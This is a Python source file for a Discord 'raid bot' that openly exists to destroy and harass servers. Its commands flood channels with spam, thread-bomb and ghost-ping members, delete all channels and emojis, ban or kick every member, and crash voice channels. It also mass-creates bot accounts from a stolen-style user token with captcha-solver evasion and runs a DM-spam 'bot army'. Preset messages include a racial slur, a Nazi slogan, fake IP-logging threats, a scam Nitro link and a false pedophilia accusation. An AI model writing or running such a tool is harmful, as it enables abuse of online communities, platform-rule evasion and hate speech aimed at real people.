import os
import asyncio
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
import raider

load_dotenv()

# ── dependency checks ──────────────────────────────────────────────────────────
try:
    from playwright.async_api import async_playwright as _pw_check  # noqa
    print("[deps] playwright ✅", flush=True)
except ImportError:
    print("[deps] playwright ❌ — audio captcha solver disabled", flush=True)

try:
    from faster_whisper import WhisperModel as _fw_check  # noqa
    print("[deps] faster-whisper ✅", flush=True)
except ImportError:
    print("[deps] faster-whisper ❌ — audio transcription disabled", flush=True)

# ── health server ──────────────────────────────────────────────────────────────
_PORT = int(os.environ.get("PORT", "8080"))

class _H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ("/", "/health"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, *_):
        pass

_srv = ThreadingHTTPServer(("0.0.0.0", _PORT), _H)
threading.Thread(target=_srv.serve_forever, daemon=True).start()
print(f"[health] :{_PORT} ready", flush=True)

# ── config ─────────────────────────────────────────────────────────────────────
TOKEN         = os.environ.get("BOT_TOKEN") or os.environ.get("DISCORD_TOKEN") or ""
CLIENT_ID     = os.environ.get("CLIENT_ID", "")
HOME_GUILD    = os.environ.get("HOME_GUILD", "")

intents = discord.Intents.all()
bot     = commands.Bot(command_prefix="!", intents=intents)
tree    = bot.tree

# ── presets ────────────────────────────────────────────────────────────────────
PRESETS: dict[str, str] = {
    "1": "@everyone this server is being DELETED",
    "2": "nigger",
    "3": "@everyone heil hitler this server is done",
    "4": "@everyone your IP has been logged: {ip}",
    "5": "@everyone FREE NITRO discord.gift/xXxXxXxX",
    "6": "@everyone the owner is a pedophile get out now",
    "7": "@everyone THIS SERVER HAS BEEN RAIDED 💀💀💀",
    "8": "@everyone your account has been flagged for termination",
    "9": "@everyone admin has leaked your DMs — server is compromised",
}

PRESET_HINT = (
    "1=deleted 2=slur 3=nazi 4=fake-ip 5=nitro 6=expose 7=raided 8=flagged 9=leak"
)

def resolve_preset(raw: str) -> str:
    return PRESETS.get(raw.strip(), raw.strip()) or "@everyone"


# ── async guild resolver (user-install safe) ──────────────────────────────────
async def get_guild(interaction: discord.Interaction) -> discord.Guild | None:
    """
    Works in all contexts:
    - Bot is a server member  → interaction.guild (cached, fast)
    - User-install in a guild → interaction.guild may be partial; guild_id always set
    - fetch_guild() hits the API with the bot token — works without membership
    """
    if interaction.guild and interaction.guild.me is not None:
        return interaction.guild          # full cached guild — fastest path
    if interaction.guild_id:
        try:
            return await bot.fetch_guild(interaction.guild_id)
        except Exception:
            pass
    if interaction.guild:
        return interaction.guild          # partial — better than nothing
    return None


# ── guild resolver ─────────────────────────────────────────────────────────────
async def resolve(interaction: discord.Interaction, guild_id: str = "") -> discord.Guild | None:
    """Admin commands: guild_id targets a specific server; falls back to current guild."""
    gid = guild_id.strip()
    if gid:
        g = bot.get_guild(int(gid))
        if g:
            return g
        try:
            return await bot.fetch_guild(int(gid))
        except Exception:
            pass
    return await get_guild(interaction)


# ── perm check helper ──────────────────────────────────────────────────────────
def missing_perms(guild: discord.Guild, **required: bool) -> list[str]:
    """Return list of missing perm names. Empty list = all good."""
    if guild is None or guild.me is None:
        return []   # user-install / not a member — skip, let it fail naturally
    gp = guild.me.guild_permissions
    return [
        name.replace("_", " ")
        for name, needed in required.items()
        if needed and not getattr(gp, name, False)
    ]


# ── safe followup helper ───────────────────────────────────────────────────────
async def _reply(interaction: discord.Interaction, content: str):
    """Send followup if deferred, otherwise respond."""
    try:
        if interaction.response.is_done():
            await interaction.followup.send(content, ephemeral=True)
        else:
            await interaction.response.send_message(content, ephemeral=True)
    except Exception:
        pass


# ── startup sync ───────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    if HOME_GUILD:
        try:
            cmds = await tree.sync(guild=discord.Object(id=int(HOME_GUILD)))
            print(f"[sync] HOME_GUILD {HOME_GUILD} — {len(cmds)} commands", flush=True)
            others = [g for g in bot.guilds if g.id != int(HOME_GUILD)]
        except Exception as e:
            print(f"[sync] HOME_GUILD failed: {e}", flush=True)
            others = list(bot.guilds)
    else:
        others = list(bot.guilds)

    if others:
        results = await asyncio.gather(
            *[tree.sync(guild=discord.Object(id=g.id)) for g in others],
            return_exceptions=True,
        )
        ok = sum(1 for r in results if not isinstance(r, Exception))
        print(f"[sync] {ok}/{len(others)} guilds synced", flush=True)

    await tree.sync()
    print(f"[raid-bot] ready — {bot.user} — {len(bot.guilds)} guild(s)", flush=True)
    await bot.change_presence(activity=discord.Game("/help"))


@bot.event
async def on_guild_join(guild: discord.Guild):
    try:
        await tree.sync(guild=discord.Object(id=guild.id))
        print(f"[sync] joined {guild.name} ({guild.id})", flush=True)
    except Exception as e:
        print(f"[sync] failed {guild.id}: {e}", flush=True)


# ─────────────────────────────────────────────────────────────────────────────
# /raid  MODAL
# ─────────────────────────────────────────────────────────────────────────────

class RaidModal(discord.ui.Modal, title="Raid Config"):
    message = discord.ui.TextInput(
        label="Spam message (or 1-9 for preset)",
        placeholder=PRESET_HINT,
        max_length=1900,
    )
    times = discord.ui.TextInput(
        label="Count per channel (1-9999)",
        placeholder="50",
        max_length=4,
        default="50",
    )
    delay = discord.ui.TextInput(
        label="Delay between messages in seconds (0 = none)",
        placeholder="0",
        max_length=5,
        required=False,
        default="0",
    )

    async def on_submit(self, interaction: discord.Interaction):
        # Acknowledge immediately — prevents "did not respond in time"
        try:
            await interaction.response.defer(ephemeral=True)
        except Exception:
            return

        try:
            n = max(1, min(int(self.times.value.strip()), 9999))
        except ValueError:
            return await interaction.followup.send("count must be a number 1-9999", ephemeral=True)

        try:
            d = max(0.0, float(self.delay.value.strip() or "0"))
        except ValueError:
            d = 0.0

        msg = resolve_preset(self.message.value)
        g   = await get_guild(interaction)

        if not g:
            return await interaction.followup.send(
                "no guild context — run this in a server (or as user-install in a server channel)",
                ephemeral=True,
            )

        missing = missing_perms(g, send_messages=True)
        if missing:
            return await interaction.followup.send(
                f"missing perms: `{', '.join(missing)}` — raid cancelled",
                ephemeral=True,
            )

        await interaction.followup.send(
            f"raiding `{g.name}` — `{msg[:80]}{'…' if len(msg) > 80 else ''}` ×{n}"
            f"{f' (delay {d}s)' if d else ''}...",
            ephemeral=True,
        )
        await raider.spam_channels(g, msg, n, d)

    async def on_error(self, interaction: discord.Interaction, error: Exception):
        print(f"[RaidModal] error: {error}", flush=True)
        await _reply(interaction, f"error: {error}")


@tree.command(name="raid", description="Raid form — preset 1-9 or custom, up to 9999× per channel")
async def slash_raid(interaction: discord.Interaction):
    await interaction.response.send_modal(RaidModal())


# ─────────────────────────────────────────────────────────────────────────────
# NO-ADMIN OPS
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="thread", description="Thread bomb: flood every channel with threads (no admin)")
@app_commands.describe(
    message="Message to spam in each thread",
    threads="Threads per channel (default 10)",
    spam="Messages per thread (default 20)",
)
async def slash_thread(
    interaction: discord.Interaction,
    message: str = "@everyone",
    threads: int = 10,
    spam: int = 20,
):
    await interaction.response.defer(ephemeral=True)
    g = await get_guild(interaction)
    if not g:
        return await interaction.followup.send("no guild context", ephemeral=True)

    missing = missing_perms(g, create_public_threads=True, send_messages_in_threads=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /thread cancelled", ephemeral=True
        )

    await interaction.followup.send(
        f"thread bombing `{g.name}` — {threads} threads/channel, {spam} msgs/thread...",
        ephemeral=True,
    )
    await raider.thread_bomb(g, message, threads, spam)


@tree.command(name="ghost", description="Ghost ping loop: ping → delete → repeat (no admin)")
@app_commands.describe(times="Ping-delete cycles per channel (default 50)")
async def slash_ghost(interaction: discord.Interaction, times: int = 50):
    await interaction.response.defer(ephemeral=True)
    g = await get_guild(interaction)
    if not g:
        return await interaction.followup.send("no guild context", ephemeral=True)

    missing = missing_perms(g, send_messages=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /ghost cancelled", ephemeral=True
        )

    await interaction.followup.send(
        f"ghost pinging `{g.name}` — {times} cycles per channel...", ephemeral=True
    )
    await raider.ghost_ping(g, times)


@tree.command(name="react", description="Reaction flood: spam reactions on every recent message (no admin)")
@app_commands.describe(
    emoji="Emoji to spam (default 💀)",
    limit="Recent messages per channel to react to (default 50)",
)
async def slash_react(
    interaction: discord.Interaction,
    emoji: str = "💀",
    limit: int = 50,
):
    await interaction.response.defer(ephemeral=True)
    g = await get_guild(interaction)
    if not g:
        return await interaction.followup.send("no guild context", ephemeral=True)

    missing = missing_perms(g, add_reactions=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /react cancelled", ephemeral=True
        )

    await interaction.followup.send(
        f"reaction flooding `{g.name}` — {emoji} on last {limit} msgs/channel...", ephemeral=True
    )
    await raider.react_flood(g, emoji, limit)


# ─────────────────────────────────────────────────────────────────────────────
# SETUP COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="invite", description="Get invite links — admin / low-perm / user-install")
async def slash_invite(interaction: discord.Interaction):
    cid = CLIENT_ID or str(bot.user.id)

    perms_admin = discord.Permissions(administrator=True)
    admin_link  = discord.utils.oauth_url(int(cid), permissions=perms_admin)

    perms_low = discord.Permissions(
        view_channel=True,
        send_messages=True,
        send_messages_in_threads=True,
        create_public_threads=True,
        add_reactions=True,
        read_message_history=True,
        attach_files=True,
        embed_links=True,
    )
    low_link = discord.utils.oauth_url(int(cid), permissions=perms_low)

    user_link = (
        f"https://discord.com/oauth2/authorize?client_id={cid}"
        f"&integration_type=1&scope=applications.commands"
    )

    await interaction.response.send_message(
        "**add to server — full admin** (nuke / ban / kick / lock):\n"
        f"{admin_link}\n\n"
        "**add to server — low perms** (/raid /ghost /react /thread):\n"
        f"{low_link}\n\n"
        "**add to apps** (/raid /ghost /react /thread from any server):\n"
        f"{user_link}",
        ephemeral=True,
    )


@tree.command(name="test", description="Probe raidability of this server")
async def slash_test(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    g = await get_guild(interaction)
    if not g:
        return await interaction.followup.send(
            "no guild context — run this inside a server channel", ephemeral=True
        )
    report = await raider.probe_guild(g)
    await interaction.followup.send(report, ephemeral=True)


@tree.command(name="servers", description="List all servers the bot is in")
async def slash_servers(interaction: discord.Interaction):
    if not bot.guilds:
        return await interaction.response.send_message("not in any server", ephemeral=True)
    lines = [f"`{g.id}` | **{g.name}** | {g.member_count} members" for g in bot.guilds]
    out   = "\n".join(lines)
    if len(out) > 1900:
        out = out[:1900] + "\n…"
    await interaction.response.send_message(out, ephemeral=True)


@tree.command(name="join", description="Join a server via invite using a user token")
@app_commands.describe(invite="Invite code or URL", user_token="User token (or set USER_TOKEN env)")
async def slash_join(interaction: discord.Interaction, invite: str, user_token: str = ""):
    await interaction.response.defer(ephemeral=True)
    tok = user_token or os.environ.get("USER_TOKEN", "")
    if not tok:
        return await interaction.followup.send(
            "no user token — pass inline or set USER_TOKEN env", ephemeral=True
        )
    result = await raider.join_server(invite.split("/")[-1].strip(), tok)
    await interaction.followup.send(result, ephemeral=True)


# ─────────────────────────────────────────────────────────────────────────────
# ADMIN RAID COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="nuke", description="Delete all channels, flood with N spam channels (needs manage_channels)")
@app_commands.describe(guild_id="Target guild ID (blank = this server)", name="Channel name", count="Channels to create")
async def slash_nuke(
    interaction: discord.Interaction,
    guild_id: str = "",
    name: str = "nuked",
    count: int = 50,
):
    await interaction.response.defer(ephemeral=True)
    g = await resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found — bot must be a member for /nuke", ephemeral=True)

    missing = missing_perms(g, manage_channels=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /nuke cancelled", ephemeral=True
        )

    await interaction.followup.send(f"nuking `{g.name}`...", ephemeral=True)
    await raider.nuke_guild(g, name, count)


@tree.command(name="dmall", description="DM every member in the server")
@app_commands.describe(message="Message to DM", limit="Max members (0 = all)")
async def slash_dmall(
    interaction: discord.Interaction,
    message: str = "you got raided",
    limit: int = 0,
):
    await interaction.response.defer(ephemeral=True)
    g = await get_guild(interaction)
    if not g:
        return await interaction.followup.send("no guild context", ephemeral=True)
    count = await raider.dm_members(g, message, limit)
    await interaction.followup.send(f"DMed {count} members", ephemeral=True)


@tree.command(name="banall", description="Ban all non-owner members (needs ban_members)")
@app_commands.describe(guild_id="Target guild ID (blank = this server)")
async def slash_banall(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = await resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found — bot must be a member for /banall", ephemeral=True)

    missing = missing_perms(g, ban_members=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /banall cancelled", ephemeral=True
        )

    await interaction.followup.send(f"banning all in `{g.name}`...", ephemeral=True)
    await raider.ban_all(g)


@tree.command(name="kickall", description="Kick all non-owner members (needs kick_members)")
@app_commands.describe(guild_id="Target guild ID (blank = this server)")
async def slash_kickall(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = await resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found — bot must be a member for /kickall", ephemeral=True)

    missing = missing_perms(g, kick_members=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /kickall cancelled", ephemeral=True
        )

    await interaction.followup.send(f"kicking all in `{g.name}`...", ephemeral=True)
    await raider.kick_all(g)


@tree.command(name="lockdown", description="Deny @everyone send/read on every channel (needs manage_channels)")
@app_commands.describe(guild_id="Target guild ID (blank = this server)")
async def slash_lockdown(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = await resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found — bot must be a member for /lockdown", ephemeral=True)

    missing = missing_perms(g, manage_channels=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /lockdown cancelled", ephemeral=True
        )

    count = await raider.lockdown_channels(g)
    await interaction.followup.send(f"locked {count} channels in `{g.name}`", ephemeral=True)


@tree.command(name="fullrape", description="Full sequence: roles → nuke → spam → DMs → webhooks (needs admin)")
@app_commands.describe(guild_id="Target guild ID (blank = this server)")
async def slash_fullrape(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = await resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found — bot must be a member for /fullrape", ephemeral=True)

    missing = missing_perms(
        g, manage_roles=True, manage_channels=True,
        ban_members=True, send_messages=True
    )
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /fullrape cancelled", ephemeral=True
        )

    await interaction.followup.send(f"running full sequence on `{g.name}`...", ephemeral=True)
    await raider.delete_roles(g)
    await raider.delete_emojis(g)
    await raider.nuke_guild(g, "raided", 50)
    await raider.mention_spam(g, 30)
    await raider.dm_members(g, "@everyone this server has been raided 💀")
    await raider.ban_all(g)


@tree.command(name="webhook", description="Webhook spam — creates webhook per channel, fires N messages each")
@app_commands.describe(
    message="Message to spam (or 1-9 for preset)",
    times="Messages per channel (default 50)",
)
async def slash_webhook(
    interaction: discord.Interaction,
    message: str = "@everyone",
    times: int = 50,
):
    await interaction.response.defer(ephemeral=True)
    g = await get_guild(interaction)
    if not g:
        return await interaction.followup.send("no guild context", ephemeral=True)

    missing = missing_perms(g, manage_webhooks=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /webhook cancelled", ephemeral=True
        )

    msg = resolve_preset(message)
    await interaction.followup.send(
        f"webhook spamming `{g.name}` — {times}× per channel...", ephemeral=True
    )
    await raider.webhook_spam(g, msg, times)


@tree.command(name="vc", description="VC ops: disconnect all members + rapid create/delete crash")
@app_commands.describe(cycles="VC crash cycles (default 30)")
async def slash_vc(interaction: discord.Interaction, cycles: int = 30):
    await interaction.response.defer(ephemeral=True)
    g = await get_guild(interaction)
    if not g:
        return await interaction.followup.send("no guild context", ephemeral=True)

    missing = missing_perms(g, move_members=True, manage_channels=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /vc cancelled", ephemeral=True
        )

    await interaction.followup.send(
        f"VC raid on `{g.name}` — disconnecting + {cycles} crash cycles...", ephemeral=True
    )
    await asyncio.gather(
        raider.vc_kick_all(g),
        raider.crash_vc(g, cycles),
        return_exceptions=True,
    )


@tree.command(name="rename", description="Rename all channels + the server itself")
@app_commands.describe(name="New name (default: raided)")
async def slash_rename(interaction: discord.Interaction, name: str = "raided"):
    await interaction.response.defer(ephemeral=True)
    g = await get_guild(interaction)
    if not g:
        return await interaction.followup.send("no guild context", ephemeral=True)

    missing = missing_perms(g, manage_channels=True, manage_guild=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /rename cancelled", ephemeral=True
        )

    await interaction.followup.send(f"renaming `{g.name}` → `{name}`...", ephemeral=True)
    await asyncio.gather(
        raider.rename_guild(g, name),
        raider.rename_channels(g, name),
        return_exceptions=True,
    )


@tree.command(name="emoji", description="Delete all server emojis (needs manage_emojis)")
async def slash_emoji(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    g = await get_guild(interaction)
    if not g:
        return await interaction.followup.send("no guild context", ephemeral=True)

    missing = missing_perms(g, manage_emojis=True)
    if missing:
        return await interaction.followup.send(
            f"missing perms: `{', '.join(missing)}` — /emoji cancelled", ephemeral=True
        )

    count = await raider.delete_emojis(g)
    await interaction.followup.send(f"deleted {count} emojis from `{g.name}`", ephemeral=True)



# ─────────────────────────────────────────────────────────────────────────────
# /make — mass bot creation
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="make", description="Create 50+ Discord bots using your user token — saves all tokens")
@app_commands.describe(
    user_token="Your Discord user token (Authorization header value)",
    count="Number of bots to create (default 50)",
    prefix="Bot name prefix (default raidbot)",
    captcha_key="Your SOLVING SERVICE api key — capsolver.com / 2captcha.com / capmonster.cloud",
    captcha_service="Solver URL (default CapSolver): https://api.capsolver.com  |  https://2captcha.com  |  https://api.capmonster.cloud",
)
async def slash_make(
    interaction: discord.Interaction,
    user_token: str,
    count: int = 50,
    prefix: str = "raidbot",
    captcha_key: str = "",
    captcha_service: str = "https://api.capsolver.com",
):
    await interaction.response.defer(ephemeral=True)

    count = max(1, min(count, 200))
    token_file = os.environ.get("BOT_TOKENS_FILE", "bots.json")

    await interaction.followup.send(
        f"creating {count} bots with prefix `{prefix}`... this takes ~{count * 1.2:.0f}s — stand by",
        ephemeral=True,
    )

    # ── validate token first ──────────────────────────────────────────────────
    ok, info = await raider.validate_user_token(user_token)
    if not ok:
        return await interaction.followup.send(
            f"token invalid — {info}\n\n"
            "make sure you copied the raw Authorization header value from Discord (no \'Bot \' or \'Bearer \' prefix)",
            ephemeral=True,
        )

    await interaction.followup.send(
        f"token valid — logged in as `{info}`\ncreating {count} bots with prefix `{prefix}`... updates every 10",
        ephemeral=True,
    )

    # ── progress callback ──────────────────────────────────────────────────────
    last_update = [0]

    async def on_progress(done: int, total_count: int, last_err: str):
        if done % 10 == 0 or done == total_count:
            msg = f"progress: {done}/{total_count} bots attempted"
            if last_err:
                msg += f"\nlast error: `{last_err}`"
            try:
                await interaction.followup.send(msg, ephemeral=True)
            except Exception:
                pass

    try:
        _cap_key = captcha_key.strip() or os.environ.get("CAPTCHA_API_KEY", "")
        _cap_svc = captcha_service.strip() or os.environ.get("CAPTCHA_SERVICE", "https://api.capsolver.com")
        created, total, errors = await raider.make_bots(
            user_token, count, prefix, token_file,
            progress_cb=on_progress,
            captcha_key=_cap_key,
            captcha_service=_cap_svc,
        )
    except Exception as e:
        return await interaction.followup.send(f"crashed: {e}", ephemeral=True)

    if not created:
        err_sample = "\n".join(errors[:3]) if errors else "unknown"
        return await interaction.followup.send(
            f"0 bots created.\nfirst errors:\n```\n{err_sample}\n```",
            ephemeral=True,
        )

    # ── send token file ────────────────────────────────────────────────────────
    import io
    lines = [f"{b['name']} | {b['id']} | {b['token']}" for b in created]
    dump  = "\n".join(lines)
    buf   = io.BytesIO(dump.encode())

    err_note = f" ({len(errors)} failed)" if errors else ""
    await interaction.followup.send(
        f"✅ created {len(created)}/{count} bots{err_note} — {total} total saved to `{token_file}`",
        file=discord.File(buf, filename="new_tokens.txt"),
        ephemeral=True,
    )


# ─────────────────────────────────────────────────────────────────────────────
# /dmspam — all saved bots DM-spam targets
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="dmspam", description="All saved bots DM every target — each sends a different message")
@app_commands.describe(
    target_user="DM a single user ID (leave blank to hit all members of this server)",
    mention="Optional user ID to @mention inside each DM",
    member_limit="Max members to pull when targeting the whole server (default 500)",
)
async def slash_dmspam(
    interaction: discord.Interaction,
    target_user: str = "",
    mention: str = "",
    member_limit: int = 500,
):
    await interaction.response.defer(ephemeral=True)

    import json, os as _os
    token_file = _os.environ.get("BOT_TOKENS_FILE", "bots.json")

    # load bot count for feedback
    bot_count = 0
    if _os.path.exists(token_file):
        try:
            bot_count = len(json.load(open(token_file)))
        except Exception:
            pass

    if bot_count == 0:
        return await interaction.followup.send(
            "no saved bots — run /make first", ephemeral=True
        )

    # resolve target user IDs
    if target_user.strip():
        user_ids = [target_user.strip()]
        desc = f"user `{target_user}`"
    else:
        g = await get_guild(interaction)
        if not g:
            return await interaction.followup.send("no guild context — pass a target_user ID", ephemeral=True)
        # fetch members via HTTP using first saved bot token
        try:
            first_token = json.load(open(token_file))[0]["token"]
        except Exception:
            return await interaction.followup.send("failed to read token file", ephemeral=True)
        user_ids = await raider._fetch_guild_members_http(first_token, g.id, member_limit)
        desc = f"{len(user_ids)} members in `{g.name}`"

    if not user_ids:
        return await interaction.followup.send("no targets found", ephemeral=True)

    await interaction.followup.send(
        f"sending {bot_count} bots × {len(user_ids)} targets → {bot_count * len(user_ids)} DMs launching...",
        ephemeral=True,
    )

    success, fail = await raider.dm_army(user_ids, token_file, mention.strip())

    await interaction.followup.send(
        f"done — ✅ {success} sent, ❌ {fail} failed",
        ephemeral=True,
    )

# ─────────────────────────────────────────────────────────────────────────────
# HELP
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="help", description="Show all commands")
async def slash_help(interaction: discord.Interaction):
    msg = (
        "**commands** (your responses are ephemeral — damage is public)\n\n"
        "**setup**\n"
        "`/invite`                   — admin + low-perm + user-install links\n"
        "`/servers`                  — list servers bot is in\n"
        "`/join <invite> [token]`    — join server via user token\n"
        "`/test`                     — raidability probe (this server)\n\n"
        "**no-admin ops** (send_messages / add_reactions / create_public_threads)\n"
        "`/raid`                     — modal: preset 1-9 or custom, up to 9999×, delay\n"
        "  presets: 1=deleted 2=slur 3=nazi 4=fake-ip 5=nitro 6=expose 7=raided 8=flag 9=leak\n"
        "`/thread [msg] [n] [s]`     — thread bomb every channel (n threads, s msgs each)\n"
        "`/ghost  [times]`           — ghost ping loop: ping→delete→repeat per channel\n"
        "`/react  [emoji] [n]`       — react flood: hit last n msgs in every channel\n\n"
        "**admin ops** (needs manage_channels / ban / kick etc.)\n"
        "`/nuke   [id] [name] [n]`   — delete all channels, create n spam channels\n"
        "`/dmall  [msg] [limit]`     — DM all members\n"
        "`/banall [id]`              — ban everyone\n"
        "`/kickall [id]`             — kick everyone\n"
        "`/lockdown [id]`            — deny @everyone everywhere\n"
        "`/webhook [msg] [n]`        — webhook spam per channel\n"
        "`/vc [cycles]`              — disconnect all + VC crash loop\n"
        "`/rename [name]`            — rename server + all channels\n"
        "`/emoji`                    — delete all emojis\n"
        "`/fullrape [id]`            — full sequence: roles→nuke→spam→DM→ban\n\n"
        "**bot army**\n"
        "`/make <token> [count] [prefix]` — create 50+ bots, save tokens\n"
        "`/dmspam [user] [mention] [limit]` — all bots DM-spam targets\n"
    )
    await interaction.response.send_message(msg, ephemeral=True)


# ─────────────────────────────────────────────────────────────────────────────
# ENTRYPOINT
# ─────────────────────────────────────────────────────────────────────────────

async def main():
    if not TOKEN:
        print(
            "[bot] no token — set BOT_TOKEN or DISCORD_TOKEN in Railway → Variables",
            flush=True,
        )
        await asyncio.Event().wait()
        return
    try:
        await bot.start(TOKEN)
    except discord.LoginFailure:
        print("[bot] LoginFailure — token invalid or revoked", flush=True)
        await asyncio.Event().wait()
    except Exception as e:
        print(f"[bot] crashed: {type(e).__name__}: {e}", flush=True)
        await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
